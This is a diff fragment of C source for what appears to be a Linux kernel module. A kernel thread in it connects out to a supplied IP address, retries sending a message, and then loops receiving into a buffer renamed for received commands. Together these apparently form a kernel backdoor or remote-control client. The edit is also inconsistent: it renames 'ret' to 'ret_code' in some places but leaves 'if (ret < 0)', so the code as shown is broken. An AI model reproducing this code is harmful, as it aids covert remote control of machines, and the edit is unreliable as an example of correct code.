@@ -18,7 +18,8 @@
 
 #define MAX_SENDING_MSG_ATTEMPTS 10
 #define TIMEOUT_BEFORE_RETRY 1000
-#define RECEIVED_BUFFER_SIZE 1024
+#define RCV_CMD_BUFFER_SIZE 1024
+#define STD_BUFFER_SIZE 4096
 
 static struct socket *sock = NULL;
 static struct task_struct *network_thread = NULL;
@@ -162,7 +163,7 @@ static int network_worker(void *data)
 	struct msghdr msg = { 0 };
 	struct kvec vec = { 0 };
 	unsigned char ip_binary[4] = { 0 };
-	int ret = 0;
+	int ret_code = 0;
 
 	// Convert IP address string into 4-byte binary format
 	if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
@@ -208,7 +209,7 @@ static int network_worker(void *data)
 			msleep(TIMEOUT_BEFORE_RETRY);
 			attempts++;
 		}
-	} while (ret < 0 && attempts < MAX_SENDING_MSG_ATTEMPTS);
+	} while (ret_code < 0 && attempts < MAX_SENDING_MSG_ATTEMPTS);
 
 	// If all attempts to send the message failed, abort
 	if (ret < 0) {
@@ -223,7 +224,7 @@ static int network_worker(void *data)
 	while (!kthread_should_stop()) {
 		struct kvec recv_vec;
 		struct msghdr recv_msg = { 0 };
-		char recv_buffer[RECEIVED_BUFFER_SIZE] = { 0 };
+		char recv_buffer[RCV_CMD_BUFFER_SIZE] = { 0 };
 
 		recv_vec.iov_base = recv_buffer;
 		recv_vec.iov_len = sizeof(recv_buffer) - 1;
